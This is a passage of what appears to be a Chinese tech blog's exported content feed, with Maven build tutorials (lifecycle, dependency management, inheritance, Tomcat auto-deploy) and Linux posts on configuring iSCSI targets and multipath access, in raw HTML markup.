id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><ul><li><p>Clean声明周期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">①pre-clean 执行一些需要在clean之前完成的工作</span><br><span class="line">②clean 移除所有上一次构建生成的文件</span><br><span class="line">③post-clean 执行一些需要在clean 之后立刻完成的工作</span><br></pre></td></tr></table></figure></li><li><p>Default声明周期<br>Default 生命周期是 Maven 生命周期中最重要的一个，绝大部分工作都发生在这个生命周期中。这里，只解释一些比较重要和常用的阶段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">validate</span><br><span class="line">generate-sources</span><br><span class="line">process-sources</span><br><span class="line">generate-resources</span><br><span class="line">process-resources 复制并处理资源文件，至目标目录，准备打包。</span><br><span class="line">compile 编译项目的源代码。</span><br><span class="line">process-classes</span><br><span class="line">generate-test-sources</span><br><span class="line">process-test-sources</span><br><span class="line">generate-test-resources</span><br><span class="line">process-test-resources 复制并处理资源文件，至目标测试目录。</span><br><span class="line">test-compile 编译测试源代码。</span><br><span class="line">process-test-classes</span><br><span class="line">test 使用合适的单元测试框架运行测试。这些测试代码不会被打包或部署。</span><br><span class="line">prepare-package</span><br><span class="line">package 接受编译好的代码，打包成可发布的格式，如 JAR。</span><br><span class="line">pre-integration-test</span><br><span class="line">integration-test</span><br><span class="line">post-integration-test</span><br><span class="line">verify</span><br><span class="line">install 将包安装至本地仓库，以让其它项目依赖。</span><br><span class="line">deploy 将最终的包复制到远程的仓库，以让其它开发人员与项目共享或部署到服务器上运行。</span><br></pre></td></tr></table></figure></li><li><p>Site生命周期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pre-site 执行一些需要在生成站点文档之前完成的工作</span><br><span class="line">site 生成项目的站点文档</span><br><span class="line">post-site 执行一些需要在生成站点文档之后完成的工作，并且为部署做准备</span><br><span class="line">site-deploy 将生成的站点文档部署到特定的服务器上</span><br></pre></td></tr></table></figure><p>这里经常用到的是 site 阶段和 site-deploy 阶段，用以生成和发布 Maven 站点，这可是 Maven 相当强大的功能，Manager 比较喜欢，文档及统计数据自动生成，很好看。</p></li></ul><h3 id="依赖的传递性"><a href="#依赖的传递性" class="headerlink" title="依赖的传递性"></a>依赖的传递性</h3><p>A依赖B，B依赖C，A能否使用C呢？要看B依赖C的范围是不是compile</p><p><img data-src="https://i.loli.net/2020/03/16/tFW13pDR62Xsi4n.png" alt="img"></p><h3 id="依赖的排除"><a href="#依赖的排除" class="headerlink" title="依赖的排除"></a>依赖的排除</h3><p>如果我们当前工程中引入了一个依赖是A，而A又依赖了B，那么Maven会自动将A依赖的B引入当前工程，但是个别情况下B有可能是一个不稳定版本，或对当前工程有不良影响。这时我们可以在引入A的时候将B排除。</p><p>①情景举例</p><p><img data-src="https://i.loli.net/2020/03/16/CEPMRWfFamTU1Qc.png" alt="这里写图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>HelloFriend<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>排除后的效果</p><p><img data-src="https://i.loli.net/2020/03/16/OAXWTifR49tDqBo.png" alt="这里写图片描述"></p><p><strong>排除也具有传递性，从哪里排除，从该层次开始往下都被排除掉了。</strong></p><h3 id="依赖的原则，解决jar包冲突"><a href="#依赖的原则，解决jar包冲突" class="headerlink" title="依赖的原则，解决jar包冲突"></a>依赖的原则，解决jar包冲突</h3><p>①路径最短者优先<br><img data-src="https://i.loli.net/2020/03/16/XYRh3gFzaiDq9LE.png" alt="这里写图片描述"></p><p>②路径相同时先声明者优先<br><img data-src="https://i.loli.net/2020/03/16/3FBvOdpKQNywekL.png" alt="这里写图片描述"></p><h3 id="统一管理所依赖-jar-包的版本"><a href="#统一管理所依赖-jar-包的版本" class="headerlink" title="统一管理所依赖 .jar 包的版本"></a>统一管理所依赖 .jar 包的版本</h3><p>对同一个框架的一组jar包最好使用相同的版本。为了方便升级架构，可以将jar包的版本信息统一提取出来</p><p>①统一声明版本号</p><p>其中 atguigu.spring.version 部分是自定义标签。</p><p><img data-src="https://i.loli.net/2020/03/16/nu8QO1JpNtEKAUG.png" alt="这里写图片描述"></p><p>②引用前面声明的版本号</p><p><img data-src="https://i.loli.net/2020/03/16/6E5qR9OsrT4BVut.png" alt="这里写图片描述"></p><p>③其他用法</p><p><img data-src="https://i.loli.net/2020/03/16/7aywXuDlqsn4i1Q.png" alt="这里写图片描述"></p><h2 id="13-设置maven的jdk版本"><a href="#13-设置maven的jdk版本" class="headerlink" title="13. 设置maven的jdk版本"></a>13. 设置maven的jdk版本</h2><p>打开settings.xml（一般在.m2目录下，没有就在maven的config目录下），找到profile标签，粘贴如下代码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="14、继承"><a href="#14、继承" class="headerlink" title="14、继承"></a>14、继承</h2><p>现状</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello依赖的Junit：4.0</span><br><span class="line">HelloFriend依赖的Junit：4.0</span><br><span class="line">MakeFriends依赖的Junit：4.9</span><br></pre></td></tr></table></figure><p>由于test范围的依赖不能传递，所以必然会分散在各个模块工程中，很容易造成版本不一致。</p><p>需求：统一管理各个模块工程中对Junit依赖的版本。</p><p>解决思路：将Junit依赖统一提取到“父”工程中，在子工程中声明Junit依赖是不指定版本，以父工程中统一设定的为准。同时也便于修改。</p><h3 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h3><p>①创建一个Maven工程作为父工程。注意：打包方式为pom</p><p><img data-src="https://i.loli.net/2020/03/16/ruebpXnFLg5z2Rj.png" alt="这里写图片描述"></p><p>②在子工程中声明对父工程的引用</p><p><img data-src="https://i.loli.net/2020/03/16/zsmDeT9v2PUnFuH.png" alt="这里写图片描述"></p><p>③将子工程的坐标中与父工程坐标中重复的内容删除</p><p><img data-src="https://i.loli.net/2020/03/16/Clb41RBYzSJ8IMU.png" alt="这里写图片描述"></p><p>④在父工程中统一管理Junit的依赖</p><p><img data-src="https://i.loli.net/2020/03/16/4aorNsZ7dLF1Ap3.png" alt="这里写图片描述"></p><p>⑤在子工程中删除Junit依赖的版本号部分</p><p><img data-src="https://i.loli.net/2020/03/16/E3Fr4YVdTLnWqa6.png" alt="这里写图片描述"></p><p>注意：配置集成后，执行安装命令时要先安装父工程。</p><h2 id="16、聚合"><a href="#16、聚合" class="headerlink" title="16、聚合"></a>16、聚合</h2><ol><li>作用：一键安装各个模块工程。</li><li>配置方式：在一个“总的聚合工程”中配置各个参与聚合的模块</li></ol><p><img data-src="https://i.loli.net/2020/03/16/6ZeSRwrljNUEtzM.png" alt="这里写图片描述"></p><p>使用方式：在聚合工程的pom.xml 上点右键-&gt;run as-&gt;maven install</p><h2 id="17、Maven-Web工程的自动部署"><a href="#17、Maven-Web工程的自动部署" class="headerlink" title="17、Maven_Web工程的自动部署"></a>17、Maven_Web工程的自动部署</h2><p>在pom.xml 中添加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置当前工程构建过程中的特殊设置   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>AtguiguWeb<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 配置构建过程中需要使用的插件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- cargo是一家专门从事启动Servlet容器的组织 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.cargo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cargo-maven2-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 针对插件进行的配置 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 配置当前系统中容器的位置 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">container</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">containerId</span>&gt;</span>tomcat6x<span class="tag">&lt;/<span class="name">containerId</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">home</span>&gt;</span>D:\DevInstall\apache-tomcat-6.0.39<span class="tag">&lt;/<span class="name">home</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">type</span>&gt;</span>existing<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">home</span>&gt;</span>D:\DevInstall\apache-tomcat-6.0.39<span class="tag">&lt;/<span class="name">home</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 如果Tomcat端口为默认值8080则不必设置该属性 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">cargo.servlet.port</span>&gt;</span>8989<span class="tag">&lt;/<span class="name">cargo.servlet.port</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 配置插件在什么情况下执行 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">              <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">                  <span class="tag">&lt;<span class="name">id</span>&gt;</span>cargo-run<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 生命周期的阶段 --&gt;</span>  </span><br><span class="line">                  <span class="tag">&lt;<span class="name">phase</span>&gt;</span>install<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">                  <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!-- 插件的目标 --&gt;</span>  </span><br><span class="line">                      <span class="tag">&lt;<span class="name">goal</span>&gt;</span>run<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">                  <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">              <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Maven </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux配置Multipath访问iSCSI服务</title>
      <link href="/archives/f30ddec7.html"/>
      <url>/archives/f30ddec7.html</url>
      
        <content type="html"><![CDATA[<p>系列文章：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b85e04d0.html">linux软riad配置详解</a></li><li><a href="https://www.ravenxrz.ink/archives/47bf0456.html">Linux配置iSCSI服务</a></li><li><a href="https://www.ravenxrz.ink/archives/f30ddec7.html">Linux配置Multipath访问iSCSI服务</a><br>本文架构参考自：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RyZWFtX3lhL2FydGljbGUvZGV0YWlscy84ODY3NDk1Mg==" title="https://blog.csdn.net/Dream_ya/article/details/88674952">https://blog.csdn.net/Dream_ya/article/details/88674952<i class="fa fa-external-link"></i></span></li></ul><h3 id="1-Multipath简介"><a href="#1-Multipath简介" class="headerlink" title="1. Multipath简介"></a>1. Multipath简介</h3><p>普通的电脑主机都是一个硬盘挂接到一个总线上，这里是一对一的关系。而到了有光纤组成的SAN环境，由于主机和存储通过了光纤交换机连接，这样的话，就构成了多对多的关系。也就是说，主机到存储可以有多条路径可以选择。主机到存储之间的IO由多条路径可以选择。</p><p><strong>实现功能</strong></p><ol><li>故障的切换和恢复</li><li>IO流量的负载均衡磁盘的虚拟化</li><li>磁盘的虚拟化</li></ol><a id="more"></a><h3 id="实验平台"><a href="#实验平台" class="headerlink" title="实验平台"></a>实验平台</h3><table><thead><tr><th align="center">主机</th><th align="center">IP</th><th align="center">操作系统</th><th>已有磁盘</th><th align="center">安装服务</th></tr></thead><tbody><tr><td align="center">Server端</td><td align="center">10.10.10.1（eth1）、192.168.1.1（eth2）</td><td align="center">Manjaro</td><td>sda，制作的raid5</td><td align="center">targetd，targetcli</td></tr><tr><td align="center">Client端</td><td align="center">10.10.10.2（eth1）、192.168.1.2（eth2）</td><td align="center">ubuntu</td><td>sda</td><td align="center">open-iscsi、multipath-tools</td></tr></tbody></table><p>这里你可能会遇到的问题：</p><ul><li><p>如何添加多余的虚拟网卡？ – 虚拟机-&gt;设置-&gt;添加即可</p></li><li><p>如何修改网卡名？ – <a href="https://www.ravenxrz.ink/archives/e7c30e88.html">点这里</a></p></li><li><p>如何设置Server和Client的各个网卡ip及默认网关？</p><p>这里简单说一下我是怎么配置的，首先我两个主机各有三张网卡，其中一张用于和外网通信，另外2张是Server和Client之间的互联。</p><p>如，Server的网卡eth1，设置ip为10.10.10.1/24，则其默认网关设置为10.10.10.2，Client则反过来。</p></li></ul><h2 id="2-iscsi配置（客户端）"><a href="#2-iscsi配置（客户端）" class="headerlink" title="2. iscsi配置（客户端）"></a>2. iscsi配置（客户端）</h2><p><strong>Server端</strong>如何配置iscsi已经在上一篇文章中写过了：<a href="https://www.ravenxrz.ink/archives/47bf0456.html">https://www.ravenxrz.ink/archives/47bf0456.html</a></p><p>唯一需要注意的是，在配置portal的时候，采用默认即可，要不就将多个ip和port都create上,以及防火墙的放行。</p><p>现在来说说Client端：</p><p><strong>发现Server的iSCSI：</strong></p><p><img data-src="https://pic.downk.cc/item/5e60d4f898271cb2b8a9aef1.jpg"></p><p><strong>登录：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm -m node -T iqn.2020-02.com.ravenxrz:server -l </span><br></pre></td></tr></table></figure><p>此时执行<code>fdisk -l</code>，你会发现被添加了很多设备（具体来说是3个，因为3张网卡）：</p><p><img data-src="https://pic.downk.cc/item/5e60d5c198271cb2b8aa1e8a.jpg"></p><p>为了解决这个问题，就要使用到multipath了。</p><h2 id="3-Multipath配置"><a href="#3-Multipath配置" class="headerlink" title="3. Multipath配置"></a>3. Multipath配置</h2><p><strong>安装multipath工具包</strong></p><ul><li>CentOs：<code> yum -y install device-mapper-multipath</code></li><li>Ubntu: <code>apt install -y multipath-tools</code> </li></ul><p><strong>配置/etc/multipath.conf</strong></p><p>/etc/multipath.conf这个文件默认是没有得，需要手动创建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">defaults &#123;</span><br><span class="line">        user_friendly_names yes# 如果是集群，则不该开启这个</span><br><span class="line">        find_multipaths yes</span><br><span class="line">&#125;</span><br><span class="line">multipaths &#123;</span><br><span class="line">    multipath &#123;</span><br><span class="line">        wwid    360014056393309b846f47bcae82517a0</span><br><span class="line">        alias   mpatho</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要修改的是wwid，执行<code>cat /etc/multipath/wwids</code>命令查看。</p><p><strong>启动multipathd守护进程</strong></p><p><code>systemctl start multipathd</code></p><p><strong>查看multipath信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipath -ll # 或者multipath -rr</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5e60db6a98271cb2b8adae36.jpg"></p><p>可以看到mapthn这个设备有三条路径。</p><p>mapthn这个设备在 /dev/mapper下，具体而言为 <code>/dev/mapper/mapthn</code>，现在对这个设备操作就是唯一的了。<br>同时也仅能对/dev/mapper/mapthn做mount操作，如果mount其余”两个设备”,会显示busy。这样就能保证不管是对从哪个接口获取的lun，<br>都可能够正确得进行操作。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RyZWFtX3lhL2FydGljbGUvZGV0YWlscy84ODY3NDk1Mg==" title="https://blog.csdn.net/Dream_ya/article/details/88674952">Linux Multipath+iscsi实现多路径配置<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGlwY2kvcC85MjQ3ODU4Lmh0bWw=" title="https://www.cnblogs.com/pipci/p/9247858.html">Ubuntu系统下的多路径软件 DM Multipath 配置<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Multipath </tag>
            
            <tag> iSCSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux配置iSCSI服务</title>
      <link href="/archives/47bf0456.html"/>
      <url>/archives/47bf0456.html</url>
      
        <content type="html"><![CDATA[<p>系列文章：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b85e04d0.html">linux软riad配置详解</a></li><li><a href="https://www.ravenxrz.ink/archives/47bf0456.html">Linux配置iSCSI服务</a></li><li><a href="https://www.ravenxrz.ink/archives/f30ddec7.html">Linux配置Multipath访问iSCSI服务</a></li></ul><p>在<a href="https://www.ravenxrz.ink/archives/b85e04d0.html">《linux软riad配置详解》</a>中讲解了如何在Linux中配置软raid，本文中我们将讲解如何让这个raid5可被客户端通过ISCSI服务访问。</p><p>实验平台：</p><p>Server端： Manjaro 内核4.9.214</p><p>Client端： Ubuntu18 内核 5.3.40</p><p>当然了，这里强烈推荐Server和Client端都是用<strong>CentOs</strong>，个人是因为笔记本已经装了Manjaro和Ubuntu不方便更换，所以就将就使用了。</p><a id="more"></a><h2 id="0-基础知识"><a href="#0-基础知识" class="headerlink" title="0. 基础知识"></a>0. 基础知识</h2><p>iSCSI 的全称是: Internet 小型计算机系统接口，是一个基于 TCP/IP 的协议，主要用于通过 IP 网络仿真 SCSI，从而为远程块存储设备提供数据传输和管理。说白了，就是通过网络由专门的服务器提供存储管理，以实现数据的远程储存，便于数据的集中管理，从而简化了数据复制、迁移和容灾。</p><h3 id="常用的基本概念"><a href="#常用的基本概念" class="headerlink" title="常用的基本概念"></a><strong>常用的基本概念</strong></h3><table><thead><tr><th align="center">名词</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">ACL</td><td align="center">访问权限控制列表，用来验证客户端启动器的访问，通常是客户端   iSCSI 启动器的 IQN 名称</td></tr><tr><td align="center">IQN</td><td align="center">用于标识单个 iSCSI   目标和启动器的唯一名称(全部小写)</td></tr><tr><td align="center">WWN</td><td align="center">用于标识单个光纤通道端口和节点的唯一编号</td></tr><tr><td align="center">TARGET</td><td align="center">iSCSI 服务器上的存储资源</td></tr><tr><td align="center">LUN</td><td align="center">iSCSI 服务器上的块设备</td></tr><tr><td align="center">initiator(启动器)</td><td align="center">以软件或硬件实施的 iSCSI 客户端</td></tr><tr><td align="center">NODE</td><td align="center">单个 iSCSI 启动器或者目标</td></tr><tr><td align="center">TPG</td><td align="center">启动器或者目标上的单个 IP 连接地址</td></tr><tr><td align="center">Portal</td><td align="center">网络接口及端口</td></tr></tbody></table><p><em>IQN 的格式为：iqn.年份-月份.com|cn|net|org.域名:自定义标识，如：iqn.2018-05.com.test:desktop;其中的字母均应为小写，即使输入时包含大写，命令执行后，系统会自动转换成小写。</em></p><h2 id="1-Server配置"><a href="#1-Server配置" class="headerlink" title="1. Server配置"></a>1. Server配置</h2><p> <strong>安装 iSCSI 服务端程序以及其配置命令工具</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S targetd targetcli # 这里用了aur，其余平台按各自的包管理器即可</span><br></pre></td></tr></table></figure><p><strong>启动targtd服务，并将其添加到开机自启中。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start targetd</span><br><span class="line">systemctl enable targetd</span><br></pre></td></tr></table></figure><p><strong>使用 targetcli 配置命令</strong></p><p>targetcli 是用于管理 iSCSI 服务端存储资源的专用配置命令，它能够提供类似于 fdisk 命令的交互式配置功能，将 iSCSI 共享资源的配置内容抽象成“目录”的形式，我们只需将各类配置信息填入到相应的“目录”中即可。</p><p>这里的难点主要在于认识每个“参数目录”的作用。当把配置参数正确地填写到“目录”中后，iSCSI 服务端就可以提供共享资源服务了。</p><p><strong>配置块设配资源池</strong></p><p>/backstores/block 是 iSCSI服务端配置共享设备的位置。在 targetcli 交互命令环境下，使用 create 命令把上述所创建的 RAID 5 磁盘阵列 /dev/md.raid5 文件加入到配置共享设备的“资源池”中，并将该文件重新命名为 disk0。</p><p>额外补充，/backstores下的四个目录的含义：</p><table><thead><tr><th align="center">目录</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">block</td><td align="center">块设备，磁盘驱动器、磁盘分区、逻辑卷、以及服务器上定义的任何 b 类型的设备文件</td></tr><tr><td align="center">fileio</td><td align="center">在服务器上生成的一个指定大小的文件，类似于虚拟机中的虚拟磁盘</td></tr><tr><td align="center">pscsi</td><td align="center">物理 SCSI，通常不使用</td></tr><tr><td align="center">ramdisk</td><td align="center">内存盘，其中存储的数据在服务器重启后将全部丢失</td></tr></tbody></table><p>具体操作：</p><p>切换到root用户，执行targetcli命令,进入targetcli管理界面，help命令可显示帮助</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /backstores/block</span><br><span class="line">create disk0 /dev/md/raid05 # create 资源名 raid设备路径(不限定是raid，只是这里以为例)</span><br></pre></td></tr></table></figure><p><strong>创建IQN：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;iscsi&#x2F;</span><br><span class="line">create iqn.2020-03.com.ravenxrz:server</span><br></pre></td></tr></table></figure><p><strong>设置ACL访问列表</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /iscsi/iqn.2020-02.com.ravenxrz:server/tpg1/acls</span><br><span class="line">create iqn.2020-03.com.ravenxrz:client# 这个要记住，后面的客户端通过配置这个来访问资源</span><br></pre></td></tr></table></figure><p><strong>创建LUN:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ../luns</span><br><span class="line">create /backstores/block/disk0</span><br></pre></td></tr></table></figure><p><strong>设置监听IP和端口：</strong></p><p>如果默认可通过多个网卡访问的话，可以不修改（后文配置Multipath访问时，就可以采用默认的配置），否则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 